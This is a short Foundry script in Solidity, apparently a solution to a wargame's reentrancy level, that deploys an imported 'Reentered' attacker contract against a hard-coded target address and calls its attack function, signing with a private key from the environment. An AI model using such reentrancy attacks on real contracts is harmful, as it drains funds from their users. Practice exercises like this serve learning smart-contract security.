// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import {Reentered} from "../src/10_Reentrancy.sol";

contract PoC is Script {
    address payable immutable reentrancy =
        payable(0x1b625D92F3E42303AbbE7F697E29e035BB6B829F); // Replace with your Reentrancy instance

    function run() external payable {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        Reentered reentered = new Reentered(reentrancy);
        reentered.attack();

        vm.stopBroadcast();
    }
}
